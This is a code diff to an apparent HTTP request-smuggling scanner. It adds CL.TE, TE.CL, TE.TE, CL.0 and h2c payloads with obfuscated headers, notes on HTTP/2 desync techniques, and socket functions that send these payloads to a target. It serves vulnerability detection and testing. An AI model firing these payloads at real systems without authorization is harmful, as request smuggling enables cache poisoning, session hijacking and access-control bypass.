@@ -17,6 +17,18 @@ CL_TE_PAYLOADS = [
         "cl_te_garbage",
         "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled?t={ts} HTTP/1.1\r\nX:"
     ),
+    (
+        "cl_te_space_cl",
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length : 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+    ),
+    (
+        "cl_te_leading_zero",
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 013\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+    ),
+    (
+        "cl_te_tab_te",
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+    ),
 ]
 
 TE_CL_PAYLOADS = [
@@ -27,6 +39,14 @@ TE_CL_PAYLOADS = [
     (
         "te_cl_x",
         "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+    ),
+    (
+        "te_cl_no_cl",
+        "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: {host}\r\n\r\n0\r\n\r\n"
+    ),
+    (
+        "te_cl_obfuscated",
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding : chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
     ),
 ]
 
@@ -43,6 +63,29 @@ TE_TE_PAYLOADS = [
         "te_te_obfuscated",
         "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
     ),
+    (
+        "te_te_semicolon",
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked;foo=bar\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+    ),
+    (
+        "te_te_double",
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+    ),
+    (
+        "te_te_space_before_colon",
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding : chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+    ),
+]
+
+CL_0_PAYLOADS = [
+    (
+        "cl_0_basic",
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\nGET /404smuggled HTTP/1.1\r\nHost: {host}\r\nX:"
+    ),
+    (
+        "cl_0_keepalive",
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\nGET /404smuggled HTTP/1.1\r\nHost: {host}\r\nX:"
+    ),
 ]
 
 H2C_UPGRADE_PAYLOADS = [
@@ -50,6 +93,25 @@ H2C_UPGRADE_PAYLOADS = [
         "h2c_upgrade",
         "GET / HTTP/1.1\r\nHost: {host}\r\nConnection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\r\n"
     ),
+]
+
+# HTTP/2 prior-knowledge preface: servers that answer it with a SETTINGS frame
+# are direct-h2 endpoints where H2.CL / H2.TE desync patterns apply.
+H2_PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+
+H2_DESYNC_PATTERNS = [
+    {
+        "type": "h2_cl_desync",
+        "note": "Front-end uses HTTP/1.1 Content-Length while back-end speaks "
+                "HTTP/2 (or vice versa): send CL:0 on the outer request and a "
+                "full second request inside the stream - requires an h2 client.",
+    },
+    {
+        "type": "h2_te_desync",
+        "note": "Transfer-Encoding smuggled into HTTP/2 (illegal in h2, but "
+                "proxies translating h2 -> h1 may mis-handle it): inject "
+                "TE: chunked via a lowercased/space-obfuscated header.",
+    },
 ]
 
 SMUGGLING_MARKER = "/404smuggled"
@@ -193,6 +255,65 @@ def _detect_h2c(host: str, port: int, timeout: float) -> List[Dict]:
     return results
 
 
+def _detect_h2_prior_knowledge(host: str, port: int, timeout: float) -> List[Dict]:
+    """Probe for direct HTTP/2 (prior knowledge): if the server answers the
+    h2 preface with a SETTINGS frame, h2 smuggling patterns are in scope."""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((host, port))
+        sock.sendall(H2_PREFACE.encode())
+        response = b""
+        try:
+            chunk = sock.recv(4096)
+            if chunk:
+                response += chunk
+        except socket.timeout:
+            pass
+        sock.close()
+        # h2 server replies with a SETTINGS frame - no "HTTP/1.1" status line
+        if response and b"HTTP/1.1" not in response and len(response) >= 9:
+            return [{"type": "h2_prior_knowledge", "variant": "preface",
+                     "detected": True, "patterns": H2_DESYNC_PATTERNS}]
+    except Exception as e:
+        logger.debug("h2 prior knowledge: %s", e)
+    return []
+
+
+def _detect_cl_0(host: str, port: int, timeout: float) -> List[Dict]:
+    """CL.0 smuggling: front-end ignores Content-Length: 0, back-end treats
+    the follow-up request as a new one -> the smuggled marker is served."""
+    results = []
+    for name, tpl in CL_0_PAYLOADS:
+        payload = tpl.format(host=host)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            sock.connect((host, port))
+            sock.sendall(payload.encode())
+            time.sleep(0.4)
+            sock.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % host.encode())
+            time.sleep(0.4)
+            response = b""
+            while True:
+                try:
+                    chunk = sock.recv(4096)
+                    if not chunk:
+                        break
+                    response += chunk
+                except socket.timeout:
+                    break
+            sock.close()
+            resp_text = response.decode("utf-8", errors="replace")
+            if SMUGGLING_MARKER in resp_text:
+                results.append({"type": "cl_0", "variant": name, "detected": True})
+                logger.info("CL.0 smuggling detected via %s", name)
+                return results
+        except Exception as e:
+            logger.debug("cl_0 %s: %s", name, e)
+    return results
+
+
 def check(url: str, param: Optional[str] = None, sess: Optional[requests.Session] = None,
           timeout: float = 10.0) -> Dict:
     host, port = _extract_host_port(url)
@@ -221,6 +342,10 @@ def check(url: str, param: Optional[str] = None, sess: Optional[requests.Session
         findings.extend(_detect_te_te(host, port, timeout))
     if not findings:
         findings.extend(_detect_h2c(host, port, timeout))
+    if not findings:
+        findings.extend(_detect_cl_0(host, port, timeout))
+    if not findings:
+        findings.extend(_detect_h2_prior_knowledge(host, port, timeout))
     if findings:
         result["vulnerable"] = True
         result["findings"] = findings
